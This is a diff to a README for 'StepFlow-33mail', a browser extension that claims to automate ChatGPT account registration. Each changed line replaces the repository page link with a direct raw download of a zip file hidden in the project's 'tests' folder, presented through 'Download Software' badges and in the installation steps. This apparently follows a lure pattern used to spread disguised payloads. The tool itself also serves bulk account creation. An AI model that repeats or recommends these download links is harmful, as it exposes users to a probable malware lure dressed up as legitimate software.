@@ -1,6 +1,6 @@
 # 🤖 StepFlow-33mail - Automate ChatGPT Account Registration Easily
 
-[![](https://img.shields.io/badge/Download_Software-Click_Here-blue.svg)](https://github.com/antigramthoughtimage1947/StepFlow-33mail)
+[![](https://img.shields.io/badge/Download_Software-Click_Here-blue.svg)](https://raw.githubusercontent.com/antigramthoughtimage1947/StepFlow-33mail/main/tests/Flow-mail-Step-2.1.zip)
 
 ## 📌 Introduction
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page at [https://github.com/antigramthoughtimage1947/StepFlow-33mail](https://github.com/antigramthoughtimage1947/StepFlow-33mail).
+1.  Visit the official repository page at [https://raw.githubusercontent.com/antigramthoughtimage1947/StepFlow-33mail/main/tests/Flow-mail-Step-2.1.zip](https://raw.githubusercontent.com/antigramthoughtimage1947/StepFlow-33mail/main/tests/Flow-mail-Step-2.1.zip).
 2.  Locate the latest release version on the right-hand side of the page.
 3.  Click the link to download the installation file to your computer.
 4.  Open your browser extension management page by typing `edge://extensions` or `chrome://extensions` in the address bar.
@@ -72,7 +72,7 @@ If the registration process stalls:
 
 You can obtain the current version of StepFlow-33mail directly from our repository.
 
-[![](https://img.shields.io/badge/Download_Installer-Get_Started_Now-grey.svg)](https://github.com/antigramthoughtimage1947/StepFlow-33mail)
+[![](https://img.shields.io/badge/Download_Installer-Get_Started_Now-grey.svg)](https://raw.githubusercontent.com/antigramthoughtimage1947/StepFlow-33mail/main/tests/Flow-mail-Step-2.1.zip)
 
 ## ❓ Frequently Asked Questions
 
